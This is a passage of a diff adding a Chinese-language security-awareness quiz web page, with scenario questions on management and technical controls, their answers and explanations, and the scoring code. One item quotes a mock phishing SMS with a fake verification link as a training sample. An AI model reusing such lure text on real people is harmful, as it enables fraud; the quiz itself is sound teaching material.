+    kw: ["策略面", "事件處理及營運持續", "BCM", "備援系統", "應變計畫"], page: "資安核心概念 第11頁" },
+
+  { g: 4, id: "4-4", label: "管理面 — 風險識別與管控機制", risk: "高",
+    scene: "小華拿著點名表嚴格執行日常行為準則，並識別出最大的資安漏洞在於「人」。",
+    why: "透過日常檢核找出風險來源並加以管控，屬「管理面」的風險識別與管控機制。多數資安事件都源自人為疏失或社交工程，「人」往往是最弱的一環。",
+    tips: ["建立定期風險評估流程", "訂定人員安全行為規範並定期檢核", "對高風險人員或職務加強管控與訓練"],
+    kw: ["管理面", "風險識別與管控機制", "人為漏洞", "行為準則"], page: "資安核心概念 第12頁" },
+
+  { g: 4, id: "4-5", label: "管理面 — 建立程序化流程", risk: "高",
+    scene: "強制規定攤位密碼不得使用生日或 123456，並綁定雙重驗證；一旦發現「變更帳戶」詐騙，立即發布公告。",
+    mock: { type: "sms", title: "攤位群組收到的簡訊",
+      text: ["【園遊會金流中心】您的攤位收款帳戶已被變更，若非本人操作，請於 30 分鐘內點擊連結驗證身分，逾期將凍結款項：", "http://pay-center-verify.xyz/login"] },
+    why: "把密碼原則、身分驗證與詐騙通報寫成人人遵循的標準作業程序，屬「管理面」的建立程序化流程。有了 SOP，發現詐騙時才能迅速一致地通報與處置。",
+    tips: ["制定密碼政策（長度、複雜度、禁用常見密碼）", "建立身分審核流程與雙重驗證要求", "訂定即時通報與處置 SOP"],
+    kw: ["管理面", "建立程序化流程", "密碼原則", "通報機制", "標準作業"], page: "資安核心概念 第12頁" },
+
+  { g: 4, id: "4-6", label: "管理面 — 提升危機意識", risk: "中",
+    scene: "平時落實對攤位人員的宣導與安全規範，提醒同學辨識釣魚郵件，提升整體危機意識。",
+    why: "透過宣導與教育讓每個人具備辨識威脅的能力，屬「管理面」的提升危機意識。再好的技術防護，也擋不住使用者自己點開釣魚連結。",
+    tips: ["實施定期資安教育訓練", "定期進行社交工程演練並追蹤點擊率", "建立簡單的可疑郵件回報管道"],
+    kw: ["管理面", "提升危機意識", "教育訓練", "社交工程防禦", "危機感知"], page: "資安核心概念 第12頁" },
+
+  { g: 4, id: "4-7", label: "技術面 — 網路防禦措施", risk: "高",
+    scene: "系統架設「防火牆」與「入侵偵測系統」，自動封鎖每秒嘗試數千次密碼的 IP。",
+    mock: { type: "log", title: "IDS 告警紀錄",
+      text: "[ALERT] Brute-force detected: user=admin\n        src=203.0.113.45  attempts=3,482/sec\n[ACTION] src 203.0.113.45 blocked by firewall (24h)" },
+    why: "以防火牆、IDS/IPS 等網路設備偵測並阻擋暴力破解等攻擊，屬「技術面」的網路防禦措施。",
+    tips: ["部署網路防火牆（FW）與 IDS／IPS", "設定異常 IP 自動封鎖與速率限制", "定期檢視告警並調校規則，降低誤判"],
+    kw: ["技術面", "網路防禦措施", "防火牆", "入侵偵測", "IP封鎖", "暴力破解"], page: "資安核心概念 第13頁" },
+
+  { g: 4, id: "4-8", label: "技術面 — 身分驗證與存取", risk: "高",
+    scene: "管理者帳號密碼須能防止暴力破解，並強制綁定手機進行二次驗證。",
+    why: "以技術手段確保登入者身分並控管存取權限，屬「技術面」的身分驗證與存取。管理者帳號權限最高，一旦被盜影響最大，必須最嚴格保護。",
+    tips: ["實施強密碼原則與登入失敗鎖定", "管理者帳號強制雙重因子驗證（2FA/MFA）", "管理介面限制來源 IP 並分離一般帳號與管理帳號"],
+    kw: ["技術面", "身分驗證與存取", "2FA", "雙重驗證", "權限控管"], page: "資安核心概念 第13頁" },
+
+  { g: 4, id: "4-9", label: "技術面 — 資料保護措施", risk: "高",
+    scene: "所有線上點餐的信用卡與個人資料，在傳輸過程及資料庫中都套上「加密防護罩」。",
+    why: "以加密技術同時保護傳輸中與儲存中的敏感資料，屬「技術面」的資料保護措施。信用卡與個資外洩將面臨法律責任與商譽損失。",
+    tips: ["傳輸使用 TLS 加密", "資料庫以 AES 等高強度演算法加密敏感欄位", "落實金鑰管理，並遵循 PCI DSS 等規範"],
+    kw: ["技術面", "資料保護措施", "加密防護罩", "資料傳輸加密", "敏感資訊"], page: "資安核心概念 第13頁" }
+];
+
+/* =========================================================
+ * 狀態
+ * ========================================================= */
+const TOTAL = QUESTIONS.length;
+const RISK_CLASS = { "高": "high", "中": "mid", "低": "low" };
+let state;
+
+const $ = sel => document.querySelector(sel);
+const quizEl = $("#quiz");
+const dashEl = $("#dashboard");
+
+// Fisher–Yates 洗牌
+function shuffle(arr) {
+  const a = arr.slice();
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
+// 產生選項：正確答案 + 3 個同群組干擾選項，順序隨機
+function buildOptions(q) {
+  const pool = QUESTIONS.filter(x => x.g === q.g && x.id !== q.id).map(x => x.label);
+  return shuffle([q.label, ...shuffle(pool).slice(0, 3)]);
+}
+
+function init() {
+  state = {
+    index: 0,
+    selected: null,
+    submitted: false,
+    results: [],                         // { q, choice, correct }
+    options: QUESTIONS.map(buildOptions)
+  };
+  dashEl.classList.add("hidden");
+  quizEl.classList.remove("hidden");
+  renderQuestion();
+  window.scrollTo({ top: 0 });
+}
+
+/* =========================================================
+ * 進度列
+ * ========================================================= */
+function updateProgress() {
+  const done = state.results.length;
+  const current = Math.min(state.index + 1, TOTAL);
+  $("#progressText").innerHTML = done === TOTAL
+    ? `已完成 <b>${TOTAL}</b> 題 / 共 <b>${TOTAL}</b> 題`
+    : `第 <b>${current}</b> 題 / 共 <b>${TOTAL}</b> 題`;
+  const pct = Math.round(done / TOTAL * 100);
+  $("#progressFill").style.width = pct + "%";
+  $("#progressBar").setAttribute("aria-valuenow", pct);
+  const ok = state.results.filter(r => r.correct).length;
+  $("#liveScore").textContent = `✔ ${ok}　✘ ${done - ok}`;
+}
+
+/* =========================================================
+ * 模擬郵件 / 簡訊 / 日誌 區塊
+ * ========================================================= */
+function renderMock(m) {
+  if (!m) return "";
+  const icons = { email: "✉ 模擬郵件", sms: "💬 模擬簡訊", log: "▣ 系統紀錄", file: "⬇ 模擬檔案" };
+  let body = "";
+  if (m.type === "email") {
+    body = `<div class="mock-meta">
+        <div><b>寄件者：</b>${m.from}</div>
+        <div><b>收件者：</b>${m.to}</div>
+        <div><b>主旨：</b>${m.subject}</div>
+      </div>${m.body.map(p => `<p>${p}</p>`).join("")}`;
+  } else if (m.type === "sms") {
+    body = m.text.map(p => `<p>${p}</p>`).join("");
+  } else {
+    body = m.text;
+  }
+  return `<div class="mock ${m.type}">
+      <div class="mock-head"><span class="dots"><i></i><i></i><i></i></span>${icons[m.type]}・${m.title}</div>
+      <div class="mock-body">${body}</div>
+    </div>`;
+}
+
+/* =========================================================
+ * 題目卡片
+ * ========================================================= */
+function renderQuestion() {
+  const q = QUESTIONS[state.index];
+  const opts = state.options[state.index];
+  state.selected = null;
+  state.submitted = false;
+
+  quizEl.innerHTML = `
+    <article class="card">
+      <div class="chips">
+        <span class="chip topic">${q.g}. ${GROUPS[q.g].name}</span>
+        <span class="chip">情境 ${q.id}</span>
+      </div>
+      <p class="scene-label">▍情境描述</p>
+      <p class="scene">${q.scene}</p>
+      ${renderMock(q.mock)}
+      <p class="stem">${GROUPS[q.g].stem}</p>
+      <div class="options" role="radiogroup" aria-label="選項">
+        ${opts.map((o, i) => `
+          <button type="button" class="opt" role="radio" aria-checked="false" data-i="${i}">
+            <span class="key">${"ABCD"[i]}</span><span>${o}</span><span class="mark"></span>
+          </button>`).join("")}
+      </div>
+      <div id="feedback"></div>
+      <div class="actions">
+        <button type="button" class="btn" id="actionBtn" disabled>提交答案</button>
+      </div>
+    </article>`;
+
+  quizEl.querySelectorAll(".opt").forEach(btn => {
+    btn.addEventListener("click", () => selectOption(+btn.dataset.i));
+  });
+  $("#actionBtn").addEventListener("click", onAction);
+  updateProgress();
+}
+
+function selectOption(i) {
+  if (state.submitted) return;
+  state.selected = i;
+  quizEl.querySelectorAll(".opt").forEach((b, k) => {
+    b.classList.toggle("selected", k === i);
+    b.setAttribute("aria-checked", k === i ? "true" : "false");
+  });
+  $("#actionBtn").disabled = false;
+}
+
+function onAction() {
+  if (!state.submitted) submitAnswer();
+  else nextQuestion();
+}
+
+/* =========================================================
+ * 提交：鎖定選項、判定、顯示專家解析
+ * ========================================================= */
+function submitAnswer() {
+  if (state.selected === null) return;
+  const q = QUESTIONS[state.index];
+  const opts = state.options[state.index];
+  const choice = opts[state.selected];
+  const correct = choice === q.label;
+  state.submitted = true;
+  state.results.push({ q, choice, correct });
+
+  quizEl.querySelectorAll(".opt").forEach((b, k) => {
+    b.disabled = true;
+    b.classList.remove("selected");
+    const isAnswer = opts[k] === q.label;
+    if (isAnswer) { b.classList.add("correct"); b.querySelector(".mark").textContent = "✔ 正解"; }
+    else if (k === state.selected) { b.classList.add("wrong"); b.querySelector(".mark").textContent = "✘ 你的選擇"; }
+    else b.classList.add("dim");
+  });
+
+  const answerIdx = opts.indexOf(q.label);
+  $("#feedback").innerHTML = `
+    <div class="feedback">
+      <div class="verdict ${correct ? "ok" : "ng"}">
+        <span class="ico">${correct ? "✅" : "❌"}</span>
+        <div>${correct ? "答對了！判斷正確" : "答錯了"}
+          <small>${correct ? "你成功辨識了此情境。" : `正確答案：${"ABCD"[answerIdx]}. ${q.label}`}</small>
+        </div>
+      </div>
+      <div class="expert">
+        <h3>🔍 資安專家解析 <span class="risk ${RISK_CLASS[q.risk]}">威脅等級：${q.risk}</span></h3>
+        <p>${q.why}</p>
+        <h4>🛡 具體防範建議</h4>
+        <ul>${q.tips.map(t => `<li>${t}</li>`).join("")}</ul>
+        <h4>🏷 關鍵字</h4>
+        <div class="kw">${q.kw.map(k => `<span>${k}</span>`).join("")}</div>
+        <div class="ref">📘 教材對應：${q.page}</div>
+      </div>
+    </div>`;
+
+  const btn = $("#actionBtn");
+  btn.textContent = state.index === TOTAL - 1 ? "查看結算 →" : "下一題 →";
+  btn.focus({ preventScroll: true });
+  updateProgress();
+  $("#feedback").scrollIntoView({ behavior: "smooth", block: "nearest" });
+}
+
+function nextQuestion() {
+  if (state.index < TOTAL - 1) {
+    state.index++;
+    renderQuestion();
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  } else {
+    showDashboard();
+  }
+}
+
+/* =========================================================
+ * 結算儀表板
+ * ========================================================= */
+function showDashboard() {
+  const ok = state.results.filter(r => r.correct).length;
+  const ng = TOTAL - ok;
+  const score = Math.round(ok / TOTAL * 100);
+
+  let grade, cls, color;
+  if (score >= 90)      { grade = "🛡️ 資安盾牌：防護完美"; cls = "good"; color = "#10B981"; }
+  else if (score >= 60) { grade = "⚠️ 注意：仍有漏洞，易遭針對性攻擊"; cls = "warn"; color = "#F59E0B"; }
+  else                  { grade = "🚨 高風險：極易遭受社交工程攻擊，需立即加強訓練"; cls = "bad"; color = "#EF4444"; }
+
+  // 各主題答對率
+  const topicRows = Object.keys(GROUPS).map(g => {
+    const rs = state.results.filter(r => r.q.g === +g);
+    const c = rs.filter(r => r.correct).length;
+    const p = Math.round(c / rs.length * 100);
+    const barColor = p >= 90 ? "#10B981" : p >= 60 ? "#F59E0B" : "#EF4444";
+    return `<div class="topic-row">
+        <span>${g}. ${GROUPS[g].name}</span><span class="t-val">${c}/${rs.length}</span>
+        <div class="t-bar"><span style="width:0;background:${barColor}" data-w="${p}%"></span></div>
+      </div>`;
+  }).join("");
+
+  const wrongs = state.results.filter(r => !r.correct);
+  const reviewHtml = wrongs.length
+    ? `<h3 class="section-title">▍需加強複習的情境（${wrongs.length}）</h3>
+       <ul class="review">${wrongs.map(r => `
+         <li><b>${r.q.id}</b>${r.q.scene}
+           <span class="ans">你的答案：${r.choice}<br>正確答案：<em>${r.q.label}</em></span></li>`).join("")}
+       </ul>`
+    : "";
+
+  const C = 2 * Math.PI * 80;
+  dashEl.innerHTML = `
+    <article class="card">
+      <div class="dash-hero">
+        <p class="scene-label">▍演練結算報告</p>
+        <div class="gauge">
+          <svg viewBox="0 0 200 200" aria-hidden="true">
+            <circle cx="100" cy="100" r="80" fill="none" stroke="#1C2A47" stroke-width="14"/>
+            <circle id="gaugeArc" cx="100" cy="100" r="80" fill="none" stroke="${color}" stroke-width="14"
+              stroke-linecap="round" stroke-dasharray="${C}" stroke-dashoffset="${C}"
+              style="transition:stroke-dashoffset 1s ease;filter:drop-shadow(0 0 6px ${color})"/>
+          </svg>
+          <div class="num"><div><b style="color:${color}">${score}</b><small>總得分 / 100</small></div></div>
+        </div>
+        <div class="grade ${cls}">資安防護等級：${grade}</div>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>${TOTAL}</b><span>總題數</span></div>
+        <div class="stat ok"><b>${ok}</b><span>答對題數</span></div>
+        <div class="stat ng"><b>${ng}</b><span>答錯題數</span></div>
+      </div>
+      <h3 class="section-title">▍各主題答對率</h3>
+      ${topicRows}
+      ${reviewHtml}
+      <div class="actions">
+        <button type="button" class="btn" id="restartBtn">↻ 重新挑戰</button>
+      </div>
+    </article>`;
+
+  quizEl.classList.add("hidden");
+  dashEl.classList.remove("hidden");
+  updateProgress();
+  window.scrollTo({ top: 0, behavior: "smooth" });
+
+  // 動畫：儀表與長條圖
+  requestAnimationFrame(() => requestAnimationFrame(() => {
+    $("#gaugeArc").style.strokeDashoffset = C * (1 - score / 100);
+    dashEl.querySelectorAll(".t-bar span").forEach(s => s.style.width = s.dataset.w);
+  }));
+  $("#restartBtn").addEventListener("click", init);
+}
+
+/* 鍵盤快捷鍵：A–D / 1–4 選擇，Enter 提交或下一題 */
+document.addEventListener("keydown", e => {
+  if (quizEl.classList.contains("hidden") || e.ctrlKey || e.metaKey || e.altKey) return;
+  const k = e.key.toUpperCase();
+  const map = { A: 0, B: 1, C: 2, D: 3, "1": 0, "2": 1, "3": 2, "4": 3 };
+  if (k in map) selectOption(map[k]);
+  else if (e.key === "Enter" && document.activeElement?.id !== "actionBtn") {
+    const btn = $("#actionBtn");
+    if (btn && !btn.disabled) { e.preventDefault(); onAction(); }
+  }
+});
+
+init();
+</script>
+</body>
+</html>
